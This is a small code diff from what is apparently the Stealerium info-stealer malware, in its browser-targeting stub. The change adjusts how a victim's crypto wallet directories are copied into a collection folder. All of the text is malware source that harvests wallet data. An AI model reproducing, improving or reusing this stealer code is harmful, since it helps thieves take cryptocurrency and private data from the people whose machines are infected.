@@ -59,7 +59,7 @@ namespace Stealerium.Stub.Target.Browsers
                 // Create the save directory if it doesn't exist
                 Directory.CreateDirectory(saveDirectory);
 
-                var destinationDirectory = Path.Combine(saveDirectory, walletName);
+                var destinationDirectory = Path.Combine(saveDirectory, walletName, Path.GetFileName(walletDirectory));
                 Directory.CreateDirectory(destinationDirectory);
                 Filemanager.CopyDirectory(walletDirectory, destinationDirectory);
 
